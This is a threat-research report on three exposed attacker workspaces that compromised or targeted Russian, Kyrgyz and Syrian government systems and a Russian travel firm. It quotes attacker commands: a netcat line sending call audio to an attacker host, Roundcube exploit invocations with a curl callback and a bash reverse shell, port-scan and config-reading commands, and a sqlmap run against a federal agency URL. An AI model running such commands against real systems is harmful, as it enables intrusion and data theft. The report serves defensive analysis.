---
title: "Russian and Allied Government Systems Compromised: Evidence From Three Exposed Operator Workspaces"
description: "Three exposed operator workspaces reveal confirmed access to Russian and Kyrgyz government systems, a Syrian Customs C2 inventory, stolen data and further exploitation attempts."
content_type: research
canonical_url: https://aabbcvc.github.io/research/government-open-directories/
categories:
  - Threat Research
tags:
  - Russia
  - C2
  - Exploitation
  - DFIR
  - Webshell
  - Credential Theft
  - Exfiltration
  - Vulnerability Research
header:
  teaser: /assets/images/covers/government-open-directories.png
  og_image: https://aabbcvc.github.io/assets/images/covers/government-open-directories.png
toc: true
---

## Overview

Using Hunt.io's AttackCapture, we identified three exposed operator workspaces linked to Russian, Kyrgyz and Syrian government systems. The directories preserved much more than target lists. They contained stolen application data, command output, malware, C2 records, exploit tools and an interactive shell history.

The evidence supports three different outcomes:

- **Confirmed application compromise:** A roleless account accessed protected administrative data in the Atlas platform used by Russia's Ministry of Emergency Situations, or MChS, and changed application state.
- **Confirmed server execution:** Uploaded PHP ran as `www-data` on a Kyrgyz Ministry of Foreign Affairs, or MFA, web host. VShell-compatible agents later ran from `/tmp`.
- **Reported historical C2 access:** A separate database recorded Syrian Customs hostnames and privileged account contexts, but did not preserve the original intrusion path or host-specific commands.
- **Repeated targeting without proof of success:** A third workspace repeatedly targeted Kyrgyzstan's national security webmail and Russian systems with public exploits and supplied credentials.

Hunt.io first observed the open directories on these dates:

| Exposed directory | First observed by Hunt.io | Strongest government-related evidence |
|---|---|---|
| `45.151.139[.]249:8765` | 30 August 2026 | MChS Atlas administrative access and state changes |
| `207.148.64[.]94:8083` | 30 August 2026 | Kyrgyz MFA command execution and implants; separate Syrian Customs C2 inventory |
| `89.124.123[.]216:8080` | 16 June 2026 | Repeated exploit attempts against GKNB webmail and Russian targets |

These are discovery dates for the exposed infrastructure. They are not the start dates of the intrusions.

We also found no evidence that all three directories belonged to one operator. Each workspace has a different evidence standard, so we assess success at the specific system or resource reached.

## 1. Russia: MChS Atlas Access and Commercial Data Theft

The first open directory exposed a broad offensive workspace. It contained 1,195 original files and a discovery corpus of more than 5.2 million unique IP addresses.

That scale reflects Internet-wide collection, not 5.2 million attacks or victims. Inside it, however, MChS received focused attention:

- 18 ministry-related domains were shortlisted.
- 18 public IP addresses were selected.
- Targets included mapping, authentication, dispatch, file-sharing and administrative services.
- The strongest result came from Atlas, an emergency-management mapping platform.

### What EMERCOM is

EMERCOM is Russia's federal emergency ministry. Its full translated name is the Ministry of Civil Defence, Emergencies and Disaster Relief of the Russian Federation. Its remit covers civil defence, disaster relief and the coordination of responses to major emergencies.

One EMERCOM subdepartment is the Information and Analytical Center of EMERCOM of Russia, commonly shortened to IAC EMERCOM. It is reportedly responsible for the ministry's internal IT and information security.

IAC EMERCOM also appeared in our earlier research, [Burnt by Burgers: Highlighting Void Blizzard's Russian State Links](https://ctrlaltintel.com/research/VoidBlizzard/). That investigation found:

- Identifiers attributed to suspected Void Blizzard member Denis Obrezko were connected to an IAC EMERCOM work number and repeated activity at EMERCOM facilities during 2021.
- US filings allege that Obrezko previously worked for the FSB and later became deputy director of Yutek-NN.
- The same filings link Yutek-NN to Void Blizzard, a Russian state-aligned cyberespionage group.
- We identified three publicly declared career transitions between Yutek-NN and IAC EMERCOM personnel.

These relationships make IAC EMERCOM a relevant suspected link to state-sponsored espionage. They do not establish that IAC EMERCOM, Atlas or the wider ministry directed or participated in Void Blizzard operations.

### A roleless Atlas account reached administrative data

The retained profile identified a "Test Operator" account with no assigned roles or additional permissions:

```json
{
  "isAdmin": false,
  "isSuperUser": false,
  "roles": [],
  "additionalPermissions": []
}
```

Despite that state, 15 of 29 administrative probes returned data. The operator could read roles, permissions, forms, categories, import definitions, metrics, regions, map-service settings and external connections.

The route behaviour showed inconsistent authorisation:

- Direct role and permission routes returned `403`.
- Parallel `/search` routes returned the protected records.
- Some requests added `X-Closed-Network: true`, apparently to claim an internal-network context.
- The retained evidence does not prove that the header alone caused the bypass.

### Samples of the stolen ATLAS data

The Atlas theft was primarily a loss of operational structure, configuration and credentials. It was not a complete export of live emergency records.

The stolen category hierarchy contained 455 retained nodes. Of these, 396 were marked `authorizedOnly: true`.

| Stolen Atlas category | Retained nodes | What it describes |
|---|---:|---|
| Situation monitoring | 210 | Layers used to track emergency conditions, hazards and response activity |
| Territorial bodies of MChS Russia | 188 | How ministry responsibilities and map content are divided across regional bodies |
| External sources | 18 | Data supplied by systems outside Atlas |
| Orthophotomaps | 13 | Aerial or satellite-derived map layers |
| MChS data | 9 | Ministry-owned information sources and operational layers |
| Monitoring | 7 | Environmental or infrastructure monitoring categories |

The retained form schemas show the types of information Atlas was designed to hold:

- **Dispatch services:** communications equipment, radio, satellite and Internet channels, address and region.
- **Temporary accommodation points:** institution name, address, phone number and capacity.
- **Education facilities:** occupancy, fire resistance, alarms, resources and daytime or night-time population.
- **Wildfire-exposed settlements:** municipality and settlement names.
- **Hazardous road sections:** road name, kilometre marker, length, capacity and description.
- **Airports:** municipality, location, characteristics, weather and major incidents.
- **Civil-defence authorities:** authority name, address, public phone number and email address.

Only 12 of a reported 1,059 forms were retained. These were schemas, not populated object rows. They reveal what Atlas collects and how responders use it, but they do not prove theft of every facility or contact record.

The operator also obtained all nine returned Kafka import definitions:

| Data feed | Topic or schema name | State | Counter |
|---|---|---|---:|
| Road accidents | `gibdd_dtp` | work | 928,826 |
| Ministry of Health incidents | `vsodchs` | work | 12,584 |
| MChS emergencies | `wiki_chs_data` | work | 14,182 |
| Water incidents | `gims_drown_request` | work | 9,189 |
| Fire danger classes | `rosgidromet_kpo_forecast_inline` | stop | 1,234,168 |
| Fire-danger forecast | `rosgidromet_ppo_forecast_inline` | stop | 824,746 |
| Groundwater monitoring | `geomonitoring_groundwater` | stop | 386,234 |
| Thermal hotspots | `kaskad_thermopoints` | stop | 178,972 |
| Utilities accidents | `gkh_accidents` | stop | 153,763 |

Together, those counters total about 3.74 million. They are application counters, not a verified count of exfiltrated records.

The import objects disclosed:

- Topic and schema names.
- Field mappings for coordinates and external IDs.
- Linked form identifiers.
- Start and stop timestamps.
- External integration endpoints.
- Two non-empty `X-AUTH-TOKEN` values in active integrations.

We have withheld the tokens. They are the most immediately useful stolen items because they could provide access to connected services after the Atlas flaw is fixed.

Other stolen administrative data included:

- 15 of 20 roles, including regional operators, a moderator and a super-user role.
- 100 permission definitions for users, roles, tokens, Kafka imports, WMS, external databases and layer import or export.
- 20 of 45 environmental metric definitions.
- 97 region nodes covering eight federal districts and 89 child regions.
- Six legitimate WMS layer configurations and one temporary test layer.
- 46 PNG attachments totalling 41.3 MB, mostly regional emblems and hazard or map icons.

The files gave the operator a working blueprint of Atlas: its protected data catalogue, administrative model, regional organisation, integrations and map-service plumbing.

> **Suggested screenshot:** A redacted composite showing the roleless profile beside the `/roles/search` response and one Kafka import definition. Blur UUIDs and remove all token values.

### The operator changed Atlas state

At 19:19:41 +03 on 27 August 2026, a new external connection named `SSRF Test` appeared. An existing Greenplum connection was updated 51 seconds later and displayed as `Greenplum_revealed`.

A second snapshot sequence showed:

- Six legitimate WMS layers.
- Seven layers after a published `Test WMS` entry appeared.
- Six layers again after the test entry disappeared.

The test layer pointed to an out-of-band callback service. A response collected through the Atlas tile proxy confirmed that the server fetched the operator-controlled URL.

This supports unauthorised administrative reads, configuration changes and a demonstrated server-side request. It does not prove an operating-system shell, administrator promotion or access to cloud metadata.

> **Suggested screenshot:** The three WMS snapshots in sequence, with the callback identifier redacted, plus the timestamped `SSRF Test` connection object.

### Union Travel: from default credentials to a private network

The same workspace contained stronger operating-system and data-theft evidence at Russian travel company Union Travel.

A Zabbix instance at `85.95.166[.]40:8080` accepted its documented default administrator credentials. The operator abused Zabbix's script functions:

```python
api("script.update", {"scriptid": sid, "command": cmd}, token)
api("script.execute", {"scriptid": sid, "hostid": hostid}, token)
```

The retained automation shows hands-on post-exploitation commands. These examples are shortened and defanged:

```bash
for p in 22 80 443 445 3389 3306 8080 5432; do
  (echo >/dev/tcp/192.168.115.20/$p) 2>/dev/null && echo "OPEN:$p"
done

find / -name 'zabbix.conf.php' 2>/dev/null | head -3
cat /var/www/html/zabbix/conf/zabbix.conf.php 2>/dev/null | grep -E 'DB_|USER|HOST'
```

Transfer and tunnel logs recorded the next steps:

- `chisel` was downloaded at 21:45:37 on 29 August 2026.
- A reverse SOCKS tunnel was listening three seconds later.
- `fscan` was downloaded at 21:47:11.
- The operator scanned `192.168.115.0/24`.
- The scan recorded 914 checks and 95 open ports.

Internal results identified `office.union-travel.ru`, named workstations, cameras, printers, SIP devices, databases, file-transfer services and Windows systems.

The operator then collected call audio. A retained command shows the transfer pattern:

```bash
curl -sk 'hxxps://192.168.115.25/<date>/<recording>.mp3' |
  base64 | nc -w 5 45.151.139[.]249 9191
```

The open directory held four SQL dumps totalling 133.6 MB:

- `cdr.sql`: 297,941 rows of call time, caller and callee identifiers, routing, duration, disposition, remote IP and recording filename.
- `clients.sql`: 6,784 rows containing client names, countries, phone numbers and legal-entity links.
- `tickets.sql`: 34,975 rows containing tickets, routes, payment context, prices, commissions, offices, managers and comments.
- `tourists.sql`: 66,954 rows containing names, dates of birth, sex, email addresses, phone numbers, employers, tax identifiers and addresses.

The `user` table also contained password and authentication-key fields. We have not reproduced them.

Seven MP3 files represented six unique recordings. This confirms customer and employee data theft, call metadata collection and audio exfiltration.

### Tooling and success

This workspace favoured simple, repeatable tools:

- `chisel` for reverse tunnels and SOCKS access.
- `fscan`, Masscan and Nmap for discovery.
- Zabbix scripts and Jenkins jobs for command execution.
- Redis cron and Patroni configuration changes for further access attempts.
- Short Python, shell and JavaScript programs tailored to individual services.

We found no ransomware, wiper or custom malware family in this collection. The pattern was discovery, weak credentials or exposed administration, command execution, tunnelling, internal discovery and data collection.

## 2. Kyrgyz MFA Compromise and a Syrian Customs C2 Inventory

The second directory contained the clearest government server compromise.

The first successful proof was timestamped 28 August 2026 at 16:29:16 UTC. It used an existing authenticated MFA backend session to upload a one-pixel GIF containing PHP through an embassy-image field.

The application gave the file a random name under `/uploads/embassies/`. Requesting the resulting `.php` path returned:

```text
[GIF prefix omitted]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
__ID_EXIT_CODE__=0
```

This confirms command execution as the web-service account on a host named `mfa`, with private address `10.51.6.93`.

The weakness is best described as authenticated executable file upload, consistent with CWE-434. The evidence does not support a specific CVE, and it does not show how the initial backend session was acquired.

### What happened after execution

The records show methodical post-exploitation from the web context.

Only `id` is preserved verbatim as the command in the proof metadata. The longer one-shot payloads are missing, so we do not present reconstructed shell syntax as exact keyboard input. Their returned output still proves the following actions:

- Enumerated the default route and local `10.51.6.64/27` network.
- Checked for `curl`, `wget` and `nc`.
- Read `.env`, `.env.local`, `.env.test`, `services.yaml` and Git metadata.
- Read Yii and Symfony configuration.
- Recovered database, application, API, cookie-signing and JWT-related secrets.
- Queried local PostgreSQL as user `utn`.
- Listed public tables, database roles and `plpgsql`.
- Enumerated SUID files, sudo behaviour, services, cron directories, timers and root-owned processes.
- Inspected Bitdefender and Puppet components.
- Tested SSH, Redis, PostgreSQL and MySQL credentials against internal systems.
- Probed internal web applications and framework debug paths.

A network-diagnostic response included:

```text
default via 10.51.6.65 dev ens192
10.51.6.64/27 dev ens192 scope link src 10.51.6.93
```

A local PostgreSQL session returned `current_user=utn`, `current_database=utn` and PostgreSQL 15.3. Visible tables included:

- `person_info`
- `organization`
- `document`
- `accident_record`
- `labour_dispute_record`
- Building, facility, device, ship, resolution and inspection tables

This proves database access and schema visibility. The collection does not contain rows extracted from those business tables.

The operator also listed a pre-existing `mfafront1.zip` archive of about 16 GB. A directory listing is not proof that the archive was created or downloaded.

### VShell agents and a web-based relay

The operator's first reverse-stage attempts failed with connectivity errors. The workflow changed to full Linux agents listening locally on the MFA host.

Two VShell-compatible payloads were confirmed by victim-side hashes, processes and sockets:

```text
/tmp/.mfa-vshell-forward-8085
/tmp/.mfa-vshell-forward-8086
```

Traffic moved through a custom relay:

```text
C2 service and SOCKS frontend
  -> local TCP-to-HTTPS adapter
  -> token-protected PHP endpoint on the MFA website
  -> Unix socket and Python bridge
  -> VShell-compatible agent on 127.0.0.1:8086
```

The victim-side components included:

- Four PHP relay endpoints under `/uploads/embassies/`.
- `/tmp/.mfa_target_forward_bridge.py`.
- `/tmp/.mfa_forward_bridge_8086.sock`.
- Local and public SOCKS or adapter ports.
- Repeated reconnect and recovery attempts.

This was an adaptive workaround for failed direct C2. It provided continuing access through the already reachable web application. The records do not prove persistence across a reboot or root access.

A separate 9,800-byte C loader was also staged. Static analysis showed it could:

- Connect to `207.148.64[.]94:8084`.
- Receive an XOR-encoded stage using key `0x99`.
- Create a memory-backed file with `memfd_create`.
- Execute the stage with `fexecve`.
- Masquerade as `[kworker/0:2]`.

Those are confirmed capabilities of the file. Successful execution of that loader on MFA was not demonstrated.

> **Suggested screenshot:** A redacted MFA proof response beside the two confirmed implant paths and a simple diagram of the PHP to Unix-socket to VShell relay.

### Lateral movement was broad but unsuccessful

The operator probed all 30 usable addresses in the local `/27`. Targets included storage, notification, document editing, licensing, vehicle inspection and construction services.

The supplied outcomes show clear limits:

- SSH verification: 198 attempts, zero successes.
- PostgreSQL reuse: 40 attempts, zero successes.
- Redis tests: authentication required or wrong password.
- MySQL tests: authentication denied.
- `sudo`: password required.
- SUID and Bitdefender checks: no privilege-escalation marker created.
- Laravel Ignition handler: debug behaviour reached, command execution unproven.
- Unsigned JWT test: response changed from `403` to `500`, no authenticated access returned.

The Kyrgyz MFA host was compromised. Wider takeover of the ministry network is not demonstrated.

### What the Syrian Customs records show

A separate historical C2 database in the same directory contained 98 registrations representing 31 distinct hostname and IP pairs.

Five hostnames explicitly used `customs.gov.sy`:

- `asyapp1`
- `asyw-db1`
- `asyw-db2`
- `backup-01`
- `oemcc`

Nearby records described virtualisation, storage, monitoring, collaboration, ERP and Windows systems. Reported account contexts included `root`, `oracle`, `vsphere-ui` and `NT AUTHORITY\SYSTEM`.

If authentic, the records are consistent with broad privileged access in a Syrian Customs environment. The limitations are substantial:

- The database contains self-reported agent identities.
- It lacks the original exploitation chain.
- It lacks host-specific terminal history.
- Repeated registrations inflate the row count.
- Two Windows identities account for 60 of 98 records.
- A probable test or analysis host named `PETER-PC` appears in the inventory.
- The surrounding collection contains `ctf`, test and replay markers.

No Syrian Customs business-data dump or verified exfiltration volume was supplied. We treat this as a historical C2 inventory associated with Syrian Customs, rather than 98 proven victim systems.

## 3. Kyrgyz National Security and Russian Targets

Hunt.io first observed the third open directory at `89.124.123[.]216:8080` on 16 June 2026.

Its 146-line `.bash_history` captured a hands-on operator:

- Cloning public exploit repositories.
- Installing PHP and Python dependencies.
- Editing exploit scripts.
- Building a malicious upgrade archive.
- Starting netcat listeners.
- Retrying callbacks with different syntax.
- Moving between unrelated products and targets.

The most persistent government target was `mail.gknb.gov[.]kg`, associated with Kyrgyzstan's State Committee for National Security, or GKNB.

No target responses, successful shell transcripts or stolen files were retained. This workspace proves targeting and attempted exploitation, not compromise.

### Roundcube CVE-2025-49113 attempts

The operator used two public proof-of-concept implementations for CVE-2025-49113, a post-authentication Roundcube remote-code-execution vulnerability involving PHP object deserialisation.

Credentials were supplied on the command line. We removed them from these examples:

```bash
php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
  <ACCOUNT> <PASSWORD> "whoami"

php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
  <ACCOUNT> <PASSWORD> \
  "curl hxxp://89.124.123[.]216:8080/$(id | base64 -w0)"

php CVE-2025-49113.php hxxps://mail.gknb.gov[.]kg/mail \
  <ACCOUNT> <PASSWORD> \
  "bash -i >& /dev/tcp/89.124.123[.]216/443 0>&1"
```

These are exact command patterns from the shell history with credentials removed and network indicators defanged.

The operator tried:

- `whoami` and `id` to confirm execution.
- Netcat callbacks on ports 443, 8080 and 8081.
- Bash `/dev/tcp` reverse shells.
- Base64-wrapped commands.
- HTTP callbacks carrying encoded command output.

Three Russian-language or Russian-linked mail hosts also appeared. One attempt requested `cat /etc/shadow`; others requested `whoami` or a reverse shell.

None of the commands has a retained success response. Even the validity of the supplied credentials cannot be confirmed from this directory.

> **Suggested screenshot:** A short extract of the shell history showing the progression from `whoami` to encoded callbacks and reverse shells. Redact every username and password.

### Other exploit tracks

The operator moved quickly between public vulnerabilities and exposed services:

| Vulnerability or mechanism | Observed activity | Supported outcome |
|---|---|---|
| Roundcube CVE-2025-49113 | Credential-supplied commands against four mail hosts | Repeated exploit attempts; no returned output |
| PAN-OS CVE-2024-3400 | Checker invocation and payload-generation tooling | The recorded checker likely failed locally due to its arguments |
| PHP-CGI CVE-2024-4577 | RCE-capable scripts run against three URL variants | Attempts; no results retained |
| ShareFile CVE-2026-2699 | Detection script run against six unique IPs | Detection requests only |
| Ivanti Sentry tooling labelled CVE-2026-10520 | 598 endpoints across 542 hosts in target lists | List-only targeting; no scanner execution captured |
| Kerio Control | Reverse-shell firmware image and CSRF upgrade tooling | Payload prepared; delivery and execution unproven |
| FreePBX API execution | Hardcoded target and reverse-shell command | Script run; authentication and callback unproven |
| SQL injection | `sqlmap` run against a Russian federal-agency URL | Attempt; no result retained |

The history also recorded this exact SQL injection command:

```bash
sqlmap -u "hxxps://fas.gov[.]ru/indikativnyj-tarif-na-transportirovku-nefti/indikat?eval_id=1"
```

A stock p0wny PHP webshell named `shell.php` was staged locally. It supports command execution, file upload and download, directory navigation and several PHP execution functions. No evidence shows that it reached a victim.

A 154-byte `upgrade.img` contained a one-line netcat reverse shell intended for Kerio's custom-upgrade process. Preparation is proven; deployment is not.

This workspace shows opportunistic tradecraft and repeated manual experimentation. Mistyped commands, invalid option combinations and payload changes suggest the operator was troubleshooting interactively rather than running a mature automated platform.

## Comparative Analysis

The three directories show a common interest in government systems, but their access paths and outcomes differ sharply.

| Dimension | MChS and Union Travel | Kyrgyz MFA and Syrian Customs | GKNB and Russian targets |
|---|---|---|---|
| Targeting | Focused MChS shortlist inside a mass-scan corpus | Government foothold followed by internal exploration; separate historical C2 cluster | Repeated webmail targeting inside a multi-product exploit workspace |
| Initial access | Broken Atlas authorisation; default Zabbix credentials | Authenticated executable image upload | Public CVEs with supplied credentials |
| Post-exploitation | Configuration theft, Zabbix commands, Chisel, fscan, SQL and audio collection | Webshell execution, secret discovery, local database access, VShell agents and a web relay | Callback listeners and payload iteration; no confirmed session |
| Strongest success | Atlas data access and state changes; deep commercial compromise | Confirmed MFA execution and implants | Targeting and attempts only |
| Government data | Atlas taxonomies, forms, privileges, integrations and two tokens | MFA application secrets and database schema; Syrian C2 identities | No retained stolen data |
| Customisation | Short service-specific automation | Custom PHP and Python transport around VShell | Mostly public proof-of-concepts and stock shell tools |
| Wider movement | Successful private-network pivot at Union Travel | Extensive discovery, but lateral logins failed | No target-side evidence of movement |

### Tradecraft

The first workspace was efficient and repeatable. The operator converted exposed administration and default credentials into tunnels, internal discovery and collection.

The MFA records show more adaptive engineering:

- A one-shot PHP upload established execution.
- Direct staging failed.
- Full agents were placed on disk.
- C2 was carried through PHP, HTTPS, a Unix socket and Python.
- The operator repeatedly repaired the relay.

The third workspace was more manual and error-prone. Its shell history shows public tooling, syntax changes and repeated listeners, but no preserved result that closes the loop.

### Opportunism and targeting

Focused government targeting and opportunistic scanning coexisted:

- MChS was deliberately shortlisted inside a corpus of millions of IPs.
- GKNB webmail was retried many times inside a workspace covering unrelated products.
- Union Travel was a commercial target where weak management credentials led to deeper access than most government probes.
- The Syrian Customs cluster may represent earlier access, a reused C2 database or a mixed analysis environment.

A large list does not equal a large victim count. Success came where ordinary controls failed: inconsistent authorisation, executable uploads, default credentials and reachable management functions.

### Success and impact

The evidence supports this hierarchy:

1. **Union Travel:** confirmed host execution, private-network pivot and theft of structured personal data and call audio.
2. **Kyrgyz MFA:** confirmed web execution, application-secret collection, local database access and two running VShell-compatible agents.
3. **MChS Atlas:** confirmed protected-data access and application-state modification, without a proven server shell.
4. **Syrian Customs:** privileged C2 registrations with limited corroboration.
5. **GKNB and other Russian targets:** repeated attempts, with no confirmed access in the supplied files.

The exposure of the workspaces caused further harm. Stolen data, credentials, target lists and tools became available from the same servers. In the first collection, access logs show that unknown third parties downloaded material from the staging host, extending the breach beyond the original collector.

## IOCs

The table contains operator infrastructure and malware or host artefacts supported by the exposed workspaces. Victim-owned public systems are excluded.

| Indicator | Type | Context |
|---|---|---|
| `45.151.139[.]249:8765` | IP:port | Unauthenticated staging and data server for the MChS and Russian commercial campaign; first observed by Hunt.io on 30 August 2026. |
| `45.151.139[.]249:8888` | IP:port | Redis cron callback listener configured in the same operator workspace. |
| `207.148.64[.]94:8083` | IP:port | Exposed staging service containing the Kyrgyz MFA records and historical C2 database; first observed by Hunt.io on 30 August 2026. |
| `207.148.64[.]94:8084` | IP:port | Staging and C2 endpoint embedded in the analysed Linux stage loader. |
| `89.124.123[.]216:8080` | IP:port | Exposed operator workspace and recurring callback destination; first observed by Hunt.io on 16 June 2026. |
| `89.124.123[.]216:8081` | IP:port | Alternate reverse-shell listener and callback port used by payloads in the same workspace. |
| `f6ee6c03cead9ef26ad5e93f11437323c5e0acef0934468880ac740531234eaa` | SHA256 | VShell-compatible Linux payload variant present in the exposed MFA collection; exact execution location was not established. |
| `d79f80b7b2b437f8d8de2e6df54d637080230377c0a07dee384112fe5ef4a81f` | SHA256 | Linux TCP stage loader that retrieves and memory-executes an XOR-decoded payload from the configured staging endpoint; execution on MFA was not proven. |
| `576eed7cf2a6e8f900cc869b8b05620afb7609ed479412e32b139c8299847ada` | SHA256 | VShell-compatible Linux forward-agent variant present in the exposed MFA collection; no victim-side hash match was retained. |
| `6dceaa79c34ee2d6ea1734d77e1f1155292e9588f35427a6dcb18f7c0120187e` | SHA256 | VShell-compatible Linux forward agent whose hash was observed on the recorded MFA host with process evidence. |
| `d0ec32e389f3ea70d70cad67061ed6fa125641925821ec0546ebc463709d8f39` | SHA256 | VShell-compatible Linux forward agent whose hash was observed at `/tmp/.mfa-vshell-forward-8085` with process and listening-socket evidence. |
| `/tmp/.mfa-vshell-forward-8085` | File path | Confirmed implant path in the supplied Kyrgyz MFA execution records. |
| `/tmp/.mfa-vshell-forward-8086` | File path | Confirmed implant path for the second VShell-compatible MFA forward agent. |

## References

- [Hunt.io](https://hunt.io/)
- [Ctrl-Alt-Intel: Burnt by Burgers, Highlighting Void Blizzard's Russian State Links](https://ctrlaltintel.com/research/VoidBlizzard/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [Roundcube security updates 1.6.11 and 1.5.10](https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10)
- [Palo Alto Networks advisory for CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400)
- [NVD entry for CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)
- [ShareFile Storage Zones Controller security advisory](https://docs.sharefile.com/en-us/sharefile/storage-zones-controller/5-0/security-vulnerability-feb26)
- [Sysdig research on VShell](https://sysdig.com/blog/unc5174-chinese-threat-actor-vshell/)
